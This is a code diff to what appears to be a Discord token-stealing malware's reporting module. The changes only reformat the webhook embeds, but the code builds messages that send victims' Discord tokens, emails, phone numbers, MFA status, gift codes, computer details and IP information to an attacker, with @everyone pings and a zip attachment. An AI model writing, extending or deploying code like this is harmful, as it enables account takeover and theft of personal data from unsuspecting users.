@@ -32,13 +32,10 @@ const json = async (zipFile) => {
 
   const embeds = [
     {
-      title: 'Computer Info',
-      fields: computerInfoFields.map(f => { return { name: f[0], value: f[1], inline: true }; })
+      description:
+        computerInfoFields.map(i => `**${i[0]}:** ${i[1]}`).join('\n') + '\n\n' +
+        ipInfoFields.map(i => `**${i[0]}:** ${i[1]}`).join('\n')
     },
-    {
-      title: 'IP Info',
-      fields: ipInfoFields.map(f => { return { name: f[0], value: f[1], inline: true }; })
-    }
   ];
   discordAccountInfo.accounts.forEach(account => { embeds.push({
     description: `Token: ${codeBlock(account.token)}`,
@@ -47,15 +44,15 @@ const json = async (zipFile) => {
       icon_url: account.avatar ? avatarURL(account.id, account.avatar) : `https://cdn.discordapp.com/embed/avatars/${account.discriminator % 5}.png`
     },
     fields: [
-      ['🆔 ID', codeBlock(account.id)],
-      ['Bio', account.bio],
-      ['🌍 Locale', codeBlock(account.locale)],
+      ['🆔 ID', code(account.id)],
+      ['📜 Bio', account.bio],
+      ['🌍 Locale', code(account.locale)],
       ['🔞 NSFW Allowed', account.nsfw_allowed],
       ['🔐 MFA Enabled', account.mfa_enabled],
       ['✉️ Email', account.email ? code(account.email) : 'No Email'],
       ['📞 Phone Number', account.phone ? code(account.phone) : 'No Phone Number'],
       ['💲 Nitro Subscription', nitroSubscriptionType(account.premium_type)],
-      ['Flags', accountFlags(account.flags) !== '' ? accountFlags(account.flags) : 'None'],
+      ['🚩 Flags', accountFlags(account.flags) !== '' ? accountFlags(account.flags) : 'None'],
     ].map(f => { return { name: f[0], value: f[1], inline: true }; }),
     color: account.accent_color,
   }); });
@@ -83,6 +80,7 @@ const json = async (zipFile) => {
       return `🎁 **${gift.promotion.outbound_title}**\n🔗 \`\`${gift.code}\`\` ([Redeem](${gift.promotion.outbound_redemption_page_link}))`;
     }).join('\n')
   });
+
   return {
     content: webhook.content, embeds, allowed_mentions: { parse: ['everyone'], },
     attachments: [
